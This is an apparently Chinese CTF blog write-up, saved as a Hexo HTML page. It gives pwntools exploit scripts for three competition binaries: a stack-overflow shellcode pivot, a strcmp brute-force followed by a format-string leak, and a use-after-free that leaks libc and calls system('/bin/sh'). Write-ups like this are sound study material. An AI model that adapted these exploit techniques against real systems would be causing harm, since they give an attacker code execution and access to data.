@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/unnamed.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/photo.gif">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="eaKNHevzJD712W6CICpiQ4_TgpzOgFr3dBKOwg7Hqs4">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"brubbish.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="比赛没参加，本篇纯属因为无聊才写的(一个多月没做pwn了，顺便复习一下exp咋写…)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第六届网络空间安全技术赛pwn">
+<meta property="og:url" content="https://brubbish.github.io/54551.html">
+<meta property="og:site_name" content="Brubbish&#39;s">
+<meta property="og:description" content="比赛没参加，本篇纯属因为无聊才写的(一个多月没做pwn了，顺便复习一下exp咋写…)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508154649.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508195950.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508202927.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508202941.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508212659.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508212648.png">
+<meta property="article:published_time" content="2021-10-05T12:49:39.023Z">
+<meta property="article:modified_time" content="2021-05-16T14:42:41.696Z">
+<meta property="article:author" content="Bruce">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508154649.png">
+
+
+<link rel="canonical" href="https://brubbish.github.io/54551.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://brubbish.github.io/54551.html","path":"54551.html","title":"第六届网络空间安全技术赛pwn"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>第六届网络空间安全技术赛pwn | Brubbish's</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Brubbish's</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
+        <li class="menu-item menu-item-读过的书"><a href="/books/" rel="section"><i class="fa fa-bookmark fa-fw"></i>读过的书</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<ins class="adsbygoogle"
+     style="display:block; text-align:center;"
+     data-ad-layout="in-article"
+     data-ad-format="fluid"
+     data-ad-client="ca-pub-9943095847270020"
+     data-ad-slot="6634125020"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+      </div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">small</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text">bank</span></a></li><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text">managebook</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Bruce</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">42</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9943095847270020"
+     crossorigin="anonymous"></script>
+<!-- sidebar -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-9943095847270020"
+     data-ad-slot="5504766755"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://brubbish.github.io/54551.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Bruce">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Brubbish's">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          第六届网络空间安全技术赛pwn
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-10-05 20:49:39" itemprop="dateCreated datePublished" datetime="2021-10-05T20:49:39+08:00">2021-10-05</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2021-05-16 22:42:41" itemprop="dateModified" datetime="2021-05-16T22:42:41+08:00">2021-05-16</time>
+      </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>比赛没参加，本篇纯属因为无聊才写的(一个多月没做pwn了，顺便复习一下exp咋写…)</p>
+<span id="more"></span>
+<p><a href="">题目</a></p>
+<h1>small</h1>
+<p>应该是签到题吧<br>
+checksec一看，保护全没开，极有可能<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508154649.png" alt="20210508154649"><br>
+向大小为0x10的栈read 0x400个字节，很直接的想法就是输入shellcode然后跳转执行<br>
+再一看下方有一个大小为0x50的bss段，exp差不多就能出来了</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&quot;./small&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span> + p64(<span class="number">0x402020</span>) + p64(<span class="number">0x401015</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload2 = <span class="string">&quot;a&quot;</span>*<span class="number">0x10</span> + p64(<span class="number">0x402020</span>) + p64(<span class="number">0x402030</span>) + shellcode</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>上学期西电新生赛的栈迁移都比这个灵活</p>
+<h1>bank</h1>
+<p>checksec:<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508195950.png" alt="20210508195950"><br>
+拖到ida里：<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508202927.png" alt="20210508202927"><br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508202941.png" alt="20210508202941"><br>
+先判断输入的password，然后printf存在很明显的格式化字符串漏洞，用于打印flag</p>
+<p>其中格式化字符串的漏洞只需要能够读栈上的值即可，这题的有意思的点在于爆破绕过strcmp<br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508212659.png" alt="20210508212659"><br>
+<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210508212648.png" alt="20210508212648"><br>
+注：fgets读取到“\n”时结束</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">	i+=<span class="number">1</span></span><br><span class="line">    p=process(<span class="string">&quot;./bank&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your account:\n&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please enter your password:\n&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;wrong&#x27;</span> <span class="keyword">in</span> p.recvline():</span><br><span class="line">		p.close()</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">	sleep(<span class="number">1</span>)</span><br><span class="line">	p.sendline(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line">	<span class="comment">#p.sendlineafter(&quot;Do you want to check your account balance?\n&quot;,&quot;yes&quot;)</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Please input your private code: \n&quot;</span>,<span class="string">&quot;%8$s&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>18年网鼎杯有个跟/dev/urandom有关的题目，<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-246590.htm%EF%BC%8C%E8%9B%AE%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%EF%BC%8Clinux%E9%BB%98%E8%AE%A4%E5%8D%95%E4%B8%AA%E8%BF%9B%E7%A8%8B%E6%89%93%E5%BC%80%E7%9A%84%E6%9C%80%E5%A4%A7%E6%96%87%E4%BB%B6%E6%95%B0%E4%B8%BA1024">https://bbs.pediy.com/thread-246590.htm，蛮有意思的，linux默认单个进程打开的最大文件数为1024</a></p>
+<h1>managebook</h1>
+<p>常规的uaf，类似经典的hacknote</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./managebooks&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./managebooks&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">name_size,name,summary_size,summary</span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter book name size: &quot;</span>,<span class="built_in">str</span>(name_size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter book name: &quot;</span>,name)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter book summary size: &quot;</span>,<span class="built_in">str</span>(summary_size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter book summary: &quot;</span>,summary)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">num</span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">num,size,summary</span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Select Book ID (0-10): &quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter book summary size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Enter book summary: &quot;</span>,summary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">num</span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Select Book ID (0-10): &quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&quot;aaaa&quot;</span>,<span class="number">0x20</span>,<span class="string">&quot;AAAA&quot;</span>)</span><br><span class="line">create(<span class="number">0x20</span>,<span class="string">&quot;bbbb&quot;</span>,<span class="number">0x20</span>,<span class="string">&quot;BBBB&quot;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>,<span class="number">0x18</span>,p64(puts_plt)+p64(<span class="number">0</span>)+p64(puts_got))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">read(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">puts_addr= u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line"></span><br><span class="line">sys = puts_addr - <span class="number">0x2a300</span></span><br><span class="line">binsh = puts_addr + <span class="number">0x11d777</span></span><br><span class="line"></span><br><span class="line">change(<span class="number">1</span>,<span class="number">0x18</span>,p64(sys) + p64(<span class="number">0</span>) + p64(binsh))</span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/26411.html" rel="prev" title="部分pwn题wp">
+                  <i class="fa fa-chevron-left"></i> 部分pwn题wp
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/57740.html" rel="next" title="CVE-2010-2883 Adobe Reader TFF字体SING表栈溢出漏洞">
+                  CVE-2010-2883 Adobe Reader TFF字体SING表栈溢出漏洞 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bruce</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9943095847270020"
+     crossorigin="anonymous"></script>
+<!-- 1 -->
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-client="ca-pub-9943095847270020"
+     data-ad-slot="9629035599"
+     data-ad-format="auto"
+     data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.18/dist/katex.min.css" integrity="sha256-M6KFoDq9eUpmogkDgw6+3R3ZgUPSuFXnQyr8tskSfQs=" crossorigin="anonymous">
+
+
+
+</body>
+</html>
